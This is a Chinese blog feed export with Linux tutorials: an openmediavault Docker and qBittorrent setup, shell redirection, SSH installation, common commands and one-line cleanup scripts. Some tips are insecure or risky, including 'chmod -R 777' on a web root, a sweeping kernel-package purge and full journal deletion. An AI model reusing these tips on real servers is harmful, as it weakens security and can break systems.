<p>但我还是很好奇为啥会装上这么古老的 Docker。我检查了 OMV-Extras 安装 Docker 时的输出，发现这个家伙竟然是从 Debian 源安装 <code>docker.io</code>，而不是从 Docker 源安装 <code>docker-ce</code>，前者已经是上古时代的东西了。</p>
<p>我在 OMV-extras 的<a href="https://github.com/OpenMediaVault-Plugin-Developers/openmediavault-omvextrasorg">仓库</a>翻了翻，发现了下面<a href="https://github.com/OpenMediaVault-Plugin-Developers/openmediavault-omvextrasorg/blob/731ce1884477e47635a41a09280a1a9844632e32/usr/sbin/omv-installdocker#L74-L84">这段代码</a>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">setDockerPackages()</span> </span><br><span class="line">&#123; </span><br><span class="line">  <span class="string">if</span> [[ <span class="string">&quot;$&#123;arch&#125;&quot;</span> <span class="string">==</span> <span class="string">&quot;i386&quot;</span> ]] <span class="string">||</span> <span class="string">!</span> <span class="string">grep</span> <span class="string">-q</span> <span class="string">&#x27;download.docker.com&#x27;</span> <span class="string">$</span>&#123;<span class="string">omvextrasList</span>&#125;<span class="string">;</span> <span class="string">then</span> </span><br><span class="line">    <span class="comment"># there is no i386 docker-ce package in the docker repos </span></span><br><span class="line">    <span class="comment"># if docker repos are disabled, use debian repos as well </span></span><br><span class="line">    <span class="comment"># use docker.io from Debian repo </span></span><br><span class="line">    <span class="string">dockerPackages=&quot;docker.io</span> <span class="string">docker-compose</span> <span class="string">$</span>&#123;<span class="string">dockerPackages</span>&#125;<span class="string">&quot; </span></span><br><span class="line"><span class="string">  else </span></span><br><span class="line"><span class="string">    dockerPackages=&quot;</span><span class="string">docker-ce</span> <span class="string">$</span>&#123;<span class="string">dockerPackages</span>&#125;<span class="string">&quot; </span></span><br><span class="line"><span class="string">  fi </span></span><br><span class="line"><span class="string">&#125; </span></span><br></pre></td></tr></table></figure>

<p>这段代码竟然直接根据源列表中是否含有 <code>download.docker.com</code> 这个字符串来决定 Docker 包名……我之前更换 OMV-extras 软件源的时候就修改了 Docker 的镜像仓库，清华 TUNA 源里显然并不包含 <code>download.docker.com</code> 这个字符串，于是 OMV-extras 就以为没有 Docker 源，选择了从 Debian 源安装。</p>
<p>真相大白，于是跑去写了个 <a href="https://github.com/OpenMediaVault-Plugin-Developers/openmediavault-omvextrasorg/issues/74">Issue</a>。很快啊，不到二十分钟，人家就修完提交了，顺带也把 Issue 关掉了。</p>
<p>现在大概是没有这个 bug 了。</p>
<h2 id="部署-qBittorrent"><a href="#部署-qBittorrent" class="headerlink" title="部署 qBittorrent"></a>部署 qBittorrent</h2><p>我们使用 linuxserver 制作的 <a href="https://hub.docker.com/r/linuxserver/qbittorrent">linuxserver&#x2F;qbittorrent</a> 镜像，使用 docker compose 部署。</p>
<p>通过 ssh 登入服务器，拉取 linuxserver&#x2F;qbittorrent 镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull linuxserver/qbittorrent:4.4.1</span><br></pre></td></tr></table></figure>

<p>然后在主目录下建立 <code>qbittorrent</code> 文件夹，在其中建立 <code>docker-compose.yml</code>，内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&quot;2.1&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">qbittorrent:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">linuxserver/qbittorrent:4.4.1</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">qbittorrent</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PUID=998</span>            <span class="comment"># 数据卷所有者的 id</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PGID=100</span>            <span class="comment"># 数据卷所属用户组的 id</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span>    <span class="comment"># 时区</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WEBUI_PORT=8080</span>     <span class="comment"># Web 界面端口，须和下方保持一致</span></span><br><span class="line">    <span class="attr">volumes:</span>                <span class="comment"># 数据卷挂载，帽号前面是宿主机，帽号后面是容器内</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/main/test/qbittorrent-config:/config</span>   <span class="comment"># 配置文件目录，根据需要修改帽号前内容</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/main/test/downloads:/downloads</span>         <span class="comment"># 下载文件目录，根据需要修改帽号前内容</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span>           <span class="comment"># Web 界面端口，须和上方保持一致</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">26881</span><span class="string">:26881</span>         <span class="comment"># BT/PT 下载用通信端口，根据需要设置</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">26881</span><span class="string">:26881/udp</span>     <span class="comment"># BT/PT 下载用通信端口，根据需要设置</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">host</span>      <span class="comment"># 网络模式，改为 host 模式</span></span><br></pre></td></tr></table></figure>

<p>这里我们选择了 qBittorrent 的 4.4.1 版本，它是 linux 下最后一个使用 Qt5 的版本。随后的版本使用了 Qt 6.3.0，但这个版本的 Qt6 存在 bug 导致 RSS 订阅功能不可用。最新的 qBittorrent 4.4.3 尚未更换 Qt 版本，只能先用这个较老的版本凑活凑活了。</p>
<p><code>PUID</code>、<code>PGID</code> 是用于解决挂载数据卷权限问题的两个环境变量，PUID 设为数据卷所有者的 id，PGID 设为数据卷所属用户组的 id。在这里，数据卷所有者之前已改为 <code>admin</code>，id 是 998；用户组是 <code>users</code>，id 是 <code>100</code>。可以通过 <code>id user</code> 命令来查看。</p>
<p>数据卷理论上可以挂载到任意位置，但通常都是会放在文件系统之中的，相对更加安全一些。这里就放在了 test 数据集下面的两个目录里。</p>
<p>网络模式强烈改为 <code>host</code> 模式，这样就会直接使用主机网卡，好处多多：可以直接使用 IPv6 地址，不用再碰 Docker 糟糕的 IPv6 支持；少过一层虚拟网卡，性能更好，连接性更优。PS：我当初找了一堆资料研究 Docker 怎么开 IPv6，后来发现用 host 模式直接解决了。</p>
<p>准备好 <code>docker-compose.yml</code> 文件后，在它所在的目录下（即 <code>qbittorrent</code>）运行下面的指令，启动编组：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>

<p>然后就可以打开浏览器，访问 <code>&lt;your_nas_ip&gt;:8080</code> 来看看能否打开 qBittorrent 的界面啦。默认的登陆用户是 <code>admin</code>，密码是 <code>adminadmin</code>。</p>
<p>登录进去之后就可以随便玩耍了，随便塞个新番的 BT 种子试试看。</p>
<h2 id="修改-Hosts"><a href="#修改-Hosts" class="headerlink" title="修改 Hosts"></a>修改 Hosts</h2><p>考虑到网络环境，有必要给一些 BT、PT 网站手动设置 Hosts。<code>/etc/hosts</code> 这个文件是由 OMV 自动管理的，需要稍稍绕点弯路。</p>
<p>首先新建 <code>/etc/hosts2</code> 文件，里面填好需要设置的 Hosts 内容。然后再新建文件 <code>/srv/salt/omv/deploy/hosts/20myentries.sls</code>，内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">append_custom_hosts:</span><br><span class="line">    file.append:</span><br><span class="line">        - name: <span class="string">&quot;/etc/hosts&quot;</span></span><br><span class="line">        - <span class="built_in">source</span>: <span class="string">&quot;/etc/hosts2&quot;</span></span><br></pre></td></tr></table></figure>

<p>随后运行 <code>sudo omv-salt deploy run hosts</code> 命令，即可使上面的设置生效。可以再次查看 <code>/etc/hosts</code> 文件，<code>hosts2</code> 的内容应该已经填充到其中了。</p>
<h2 id="结语-2"><a href="#结语-2" class="headerlink" title="结语"></a>结语</h2><p>在完成 qBittorrent 的部署之后，openmediavault 的折腾之旅算是告一段落了。本来还应该折腾折腾虚拟化，但实在使不想搞了。希望这几篇文章能给想要使用 OMV 的同学一些帮助，让大家少踩一些坑。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
        <category>os</category>
        <category>omv</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>os</tag>
        <tag>omv</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu的重定向输出功能</title>
    <url>/posts/e435522b/</url>
    <content><![CDATA[<p>在 Ubuntu 中， <code>&gt;</code> 符号主要用于<strong>重定向输出</strong>，它会将命令的输出结果发送到指定的文件或设备，而不是默认的标准输出（通常是终端屏幕）。</p>
<p>这里详细解释 <code>&gt;</code> 的用法，并提供一些示例：</p>
<p><strong>基本用法：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> &gt; file</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>command</code></strong>: 你要执行的命令。</li>
<li><strong><code>&gt;</code></strong>: 重定向操作符。</li>
<li><strong><code>file</code></strong>: 你要写入输出的目标文件。</li>
</ul>
<p><strong>工作原理：</strong></p>
<ol>
<li><strong>执行 <code>command</code></strong>: Ubuntu 首先执行 <code>command</code>。</li>
<li><strong>捕获输出</strong>: <code>command</code> 的标准输出（通常是屏幕上显示的内容）会被捕获。</li>
<li>重定向到文件<code>&gt;</code>操作符将捕获的输出重定向到<code>file</code><ul>
<li>如果 <code>file</code> 不存在，则会创建该文件。</li>
<li>如果 <code>file</code> 已经存在，则会<strong>覆盖</strong>该文件的内容。</li>
</ul>
</li>
</ol>
<p><strong>示例：</strong></p>
<ol>
<li><p><strong>将 <code>ls -l</code> 的输出保存到文件 <code>directory_listing.txt</code> 中：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l &gt; directory_listing.txt</span><br></pre></td></tr></table></figure>

<p>执行此命令后，终端屏幕上不会显示 <code>ls -l</code> 的输出，而是将输出内容写入到 <code>directory_listing.txt</code> 文件中。你可以使用 <code>cat directory_listing.txt</code> 命令查看文件内容。</p>
</li>
<li><p><strong>将字符串写入文件 <code>my_message.txt</code>：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello, world!&quot;</span> &gt; my_message.txt</span><br></pre></td></tr></table></figure>

<p>这会将 “Hello, world!” 写入到 <code>my_message.txt</code> 文件中。</p>
</li>
<li><p><strong>覆盖现有文件：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;This is the first line.&quot;</span> &gt; my_file.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;This is the second line.&quot;</span> &gt; my_file.txt</span><br></pre></td></tr></table></figure>

<p>执行上面的命令后，<code>my_file.txt</code> 文件中只会包含 “This is the second line.”，因为第一次写入的内容被第二次写入的内容覆盖了。</p>
</li>
</ol>
<p><strong>重要提示：</strong></p>
<ul>
<li><strong>覆盖风险：</strong> <code>&gt;</code> 操作符会覆盖目标文件（如果存在）。如果你想在文件末尾追加内容而不是覆盖，应该使用 <code>&gt;&gt;</code> 操作符（下面会介绍）。</li>
<li><strong>权限：</strong> 如果你没有写入目标文件的权限，重定向操作会失败。</li>
<li><strong>标准错误：</strong> <code>&gt;</code> 只重定向标准输出，不会重定向标准错误。如果想重定向标准错误，需要使用 <code>2&gt;</code> 操作符（下面会介绍）。</li>
</ul>
<p><strong>其他相关操作符：</strong></p>
<ol>
<li><p><strong><code>&gt;&gt;</code> (追加输出):</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> &gt;&gt; file</span><br></pre></td></tr></table></figure>

<p>与 <code>&gt;</code> 类似，但它会将输出<strong>追加</strong>到目标文件末尾，而不是覆盖。如果文件不存在，则会创建。</p>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;First line.&quot;</span> &gt;&gt; my_log.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Second line.&quot;</span> &gt;&gt; my_log.txt</span><br></pre></td></tr></table></figure>

<p><code>my_log.txt</code> 文件中会包含两行内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">First line.</span><br><span class="line">Second line.</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>2&gt;</code> (重定向标准错误):</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> 2&gt; error_file</span><br></pre></td></tr></table></figure>

<p><code>2&gt;</code> 操作符会将命令的<strong>标准错误</strong>（通常是错误信息）重定向到 <code>error_file</code>。</p>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> non_existent_file 2&gt; error.log</span><br></pre></td></tr></table></figure>

<p>如果 <code>non_existent_file</code> 不存在，<code>ls</code> 命令会产生错误信息，该错误信息会被写入到 <code>error.log</code> 文件中，而不是显示在终端屏幕上。</p>
</li>
<li><p><strong><code>&amp;&gt;</code> 或 <code>&gt;&amp;</code> (重定向标准输出和标准错误):</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> &amp;&gt; output.log</span><br><span class="line"><span class="built_in">command</span> &gt;&amp; output.log</span><br></pre></td></tr></table></figure>

<p>这两个操作符会将命令的<strong>标准输出和标准错误</strong>都重定向到 <code>output.log</code> 文件中。</p>
</li>
<li><p><code>2&gt;&amp;1</code>将<strong>标准错误 (stderr)</strong> 重定向到与<strong>标准输出 (stdout)</strong> 相同的位置。</p>
</li>
</ol>
<ul>
<li><strong><code>2</code></strong>: 代表标准错误 (stderr) 的文件描述符。在 Unix 系统中，标准错误通常用于输出错误信息。</li>
<li><strong><code>&gt;</code></strong>: 是重定向操作符，表示将输出重定向到指定的目标。</li>
<li><strong><code>&amp;1</code></strong>: <code>&amp;</code> 符号表示后面的数字是一个文件描述符，而不是一个文件名。<code>1</code> 代表标准输出 (stdout) 的文件描述符。</li>
</ul>
<p><strong>组合起来，<code>2&gt;&amp;1</code> 的含义是：</strong></p>
<p>“将标准错误（文件描述符 2）重定向到与标准输出（文件描述符 1）相同的位置。”</p>
<p><strong>工作原理和应用场景：</strong></p>
<ol>
<li><strong>默认情况：</strong><ul>
<li>默认情况下，标准输出 (stdout) 会输出到终端屏幕，而标准错误 (stderr) 也会输出到终端屏幕。</li>
<li>如果一个命令既有正常输出，又有错误信息，它们都会混杂地显示在终端上。</li>
</ul>
</li>
<li><strong>使用 <code>2&gt;&amp;1</code>：</strong><ul>
<li>通过使用 <code>2&gt;&amp;1</code>，你可以将标准错误信息与标准输出信息合并到同一个输出流中。</li>
<li>这意味着你可以将所有输出（包括正常输出和错误信息）重定向到同一个文件，或者通过管道传递给其他命令进行处理。</li>
</ul>
</li>
</ol>
<p><strong>示例：</strong></p>
<p>假设你有一个命令 <code>my_script.sh</code>，它可能会产生标准输出和标准错误。</p>
<ol>
<li><p><strong>默认情况 (不使用重定向):</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./my_script.sh</span><br></pre></td></tr></table></figure>

<p>该命令的输出（包括标准输出和标准错误）都会显示在终端屏幕上，可能会混杂在一起。</p>
</li>
<li><p><strong>将标准输出重定向到 <code>output.txt</code>，但标准错误仍然输出到终端：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./my_script.sh &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>标准输出被写入到 <code>output.txt</code> 文件中，但标准错误仍然会显示在终端屏幕上。</p>
</li>
<li><p><strong>将标准输出重定向到 <code>output.txt</code>，并将标准错误也重定向到 <code>output.txt</code>：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./my_script.sh &gt; output.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>或者，也可以使用 <code>&amp;&gt;</code> 或 <code>&gt;&amp;</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./my_script.sh &amp;&gt; output.txt</span><br><span class="line">./my_script.sh &gt;&amp; output.txt</span><br></pre></td></tr></table></figure>

<p>现在，标准输出和标准错误都会被写入到 <code>output.txt</code> 文件中。</p>
</li>
<li><p><strong>将标准输出和标准错误都通过管道传递给 <code>grep</code> 命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./my_script.sh 2&gt;&amp;1 | grep <span class="string">&quot;error&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个命令将 <code>my_script.sh</code> 的所有输出（包括错误信息）传递给 <code>grep</code> 命令，<code>grep</code> 会过滤出包含 “error” 的行，并显示在终端屏幕上。</p>
</li>
</ol>
<p><strong>重要提示：</strong></p>
<ul>
<li>顺序很重要：在重定向时，<code>2&gt;&amp;1</code>必须在重定向到文件的操作之后。例如:<ul>
<li><code>command &gt; output.txt 2&gt;&amp;1</code> (正确)</li>
<li><code>command 2&gt;&amp;1 &gt; output.txt</code> (错误，可能不会按照预期工作)</li>
</ul>
</li>
<li><strong><code>&amp;&gt;</code> 或 <code>&gt;&amp;</code> 语法更简洁：</strong> 在现代的 bash shell 中，<code>&amp;&gt;</code> 和 <code>&gt;&amp;</code> 是 <code>&gt; file 2&gt;&amp;1</code> 的简写形式，更方便使用。</li>
</ul>
<p><strong>总结：</strong></p>
<p><code>2&gt;&amp;1</code> 是一个非常有用的操作符，它可以让你将标准错误和标准输出合并，方便你统一处理命令的所有输出。这在需要将所有输出写入文件、通过管道传递给其他命令或者进行错误分析时非常有用。理解 <code>2&gt;&amp;1</code> 的工作原理可以帮助你更有效地使用 Linux 命令行。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu安装ssh</title>
    <url>/posts/63ab82a5/</url>
    <content><![CDATA[<p>要在Ubuntu上安装SSH服务器，你可以按照以下步骤进行：</p>
<ol>
<li><p><strong>更新包列表</strong>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>安装OpenSSH服务器</strong>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install openssh-server</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>检查SSH服务状态</strong>: 安装完成后，SSH服务会自动启动。你可以使用以下命令检查SSH服务的状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status ssh</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>启动SSH服务</strong>（如果未自动启动）:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start ssh</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>设置SSH服务开机自启动</strong>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> ssh</span><br></pre></td></tr></table></figure></li>
</ol>
<p>完成这些步骤后，你的Ubuntu系统应该已经成功安装并运行了SSH服务器。你可以使用SSH客户端连接到你的Ubuntu系统，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh username@your_server_ip</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux常用命令</title>
    <url>/posts/fe4ef317/</url>
    <content><![CDATA[<h1 id="ubuntu-debian包管理命令"><a href="#ubuntu-debian包管理命令" class="headerlink" title="ubuntu&#x2F;debian包管理命令"></a>ubuntu&#x2F;debian包管理命令</h1><p><strong>更新系统所有</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure>

<p><strong>更新现有软件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt upgrade -y</span><br></pre></td></tr></table></figure>

<p><strong>更新软件依赖关系****更新现有软件删除依赖以外的软件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt full-upgrade -y</span><br></pre></td></tr></table></figure>

<p><strong>安装或更新指定软件如：curl wget</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y curl wget</span><br></pre></td></tr></table></figure>

<p><strong>删除指定软件****如：curl wget</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt remove -y curl wget</span><br><span class="line"></span><br><span class="line">apt purge -y curl wget</span><br></pre></td></tr></table></figure>

<h1 id="Alpine-Linux包管理命令"><a href="#Alpine-Linux包管理命令" class="headerlink" title="Alpine Linux包管理命令"></a>Alpine Linux包管理命令</h1><p><strong>更新系统所有</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apk update</span><br></pre></td></tr></table></figure>

<p><strong>更新现有软件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apk upgrade</span><br></pre></td></tr></table></figure>

<p><strong>安装或更新指定软件如：curl docker</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apk add curl docker</span><br></pre></td></tr></table></figure>

<p><strong>删除指定软件****如：curl wget</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apk del wget</span><br></pre></td></tr></table></figure>

<h1 id="CentOS包管理命令"><a href="#CentOS包管理命令" class="headerlink" title="CentOS包管理命令"></a>CentOS包管理命令</h1><p><strong>更新系统所有</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>

<p><strong>安装或更新指定软件如：curl wget</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y curl wget</span><br></pre></td></tr></table></figure>

<p><strong>删除指定软件****如：curl wget</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum remove -y curl wget</span><br></pre></td></tr></table></figure>

<h1 id="文件管理相关"><a href="#文件管理相关" class="headerlink" title="文件管理相关"></a>文件管理相关</h1><p><strong>查看home目录下内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /home/</span><br></pre></td></tr></table></figure>

<p><strong>进入home目录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br></pre></td></tr></table></figure>

<p><strong>创建web目录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> web</span><br></pre></td></tr></table></figure>

<p><strong>创建空nginx.conf文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> nginx.conf</span><br></pre></td></tr></table></figure>

<p><strong>编辑docker-compose.yml文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano docker-compose.yml</span><br></pre></td></tr></table></figure>

<p><strong>压缩&#x2F;home&#x2F;web目录，压缩包存放到当前目录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -czvf web.tar.gz /home/web</span><br></pre></td></tr></table></figure>

<p><strong>当前目录解压web.tar.gz文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xzvf web.tar.gz</span><br></pre></td></tr></table></figure>

<p><strong>删除home&#x2F;web目录下所有内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -r /home/web/*</span><br></pre></td></tr></table></figure>

<p><strong>删除&#x2F;home&#x2F;web.tar.gz文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> /home/web.tar.gz</span><br></pre></td></tr></table></figure>

<p><strong>下载maccms10.zip文件到当前目录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/magicblack/maccms_down/raw/master/maccms10.zip</span><br></pre></td></tr></table></figure>

<p><strong>移动home&#x2F;web目录下所有文件到root目录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /home/web/* /root/</span><br></pre></td></tr></table></figure>

<p><strong>拷贝home&#x2F;web目录到root</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /home/web /root</span><br></pre></td></tr></table></figure>

<p><strong>拷贝home&#x2F;web目录下的test.txt到root</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /home/web/test.txt /root</span><br></pre></td></tr></table></figure>

<p><strong>赋予&#x2F;var&#x2F;www&#x2F;html最高读写权限</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> -R 777 /var/www/html</span><br></pre></td></tr></table></figure>

<p><strong>将home目录下的test.txt改名成root.txt</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /home/test.txt /home/root.txt</span><br></pre></td></tr></table></figure>

<p><strong>将root.txt中所有的test替换成root</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/test/root/g&#x27;</span> root.txt</span><br></pre></td></tr></table></figure>

<p><strong>将root.txt文件所有内容删除添加一行文本root&#x3D;12345保存退出</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /home/root.txt &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root=12345</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p><strong>在root.txt文本中末尾添加一行end&#x3D;yyds</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;end=yyds&quot;</span> &gt;&gt; root.txt</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>debian和ubuntu,centos系统一键更新清理,系统效率再提升</title>
    <url>/posts/6fea1a3a/</url>
    <content><![CDATA[<p><strong>Debian，Ubuntu</strong></p>
<p><strong>查看系统启动时间</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemd-analyze</span><br></pre></td></tr></table></figure>

<p><strong>一键纯净更新</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update -y &amp;&amp; apt full-upgrade -y &amp;&amp; apt autoremove -y &amp;&amp; apt autoclean -y</span><br></pre></td></tr></table></figure>

<p><strong>安装常用工具</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y curl wget sudo</span><br></pre></td></tr></table></figure>

<p><strong>一键清理垃圾</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt autoremove --purge -y</span><br><span class="line"></span><br><span class="line">sudo apt clean -y</span><br><span class="line"></span><br><span class="line">sudo apt autoclean -y</span><br><span class="line"></span><br><span class="line">sudo apt remove --purge $(dpkg -l | awk <span class="string">&#x27;/^rc/ &#123;print $2&#125;&#x27;</span>) -y</span><br><span class="line"></span><br><span class="line">sudo journalctl --rotate</span><br><span class="line"></span><br><span class="line">sudo journalctl --vacuum-time=1s</span><br><span class="line"></span><br><span class="line">sudo journalctl --vacuum-size=50M</span><br><span class="line"></span><br><span class="line">sudo apt remove --purge $(dpkg -l | awk <span class="string">&#x27;/^ii linux-(image|headers)-[^ ]+/&#123;print $2&#125;&#x27;</span> | grep -v $(<span class="built_in">uname</span> -r | sed <span class="string">&#x27;s/-.*//&#x27;</span>) | xargs) -y</span><br></pre></td></tr></table></figure>

<p><strong>查看Debian版本</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/debian_version</span><br></pre></td></tr></table></figure>

<p><strong>查看Ubuntu版本</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/lsb-release</span><br></pre></td></tr></table></figure>

<p><strong>CentOS</strong></p>
<p>应广大CentOS 用户要求 哈哈 下面是CentOS命令</p>
<p><strong>查看系统启动时间</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemd-analyze</span><br></pre></td></tr></table></figure>

<p><strong>一键纯净更新</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update -y &amp;&amp; yum upgrade -y &amp;&amp; yum autoremove -y &amp;&amp; yum clean all</span><br></pre></td></tr></table></figure>

<p><strong>一键清理垃圾</strong></p>
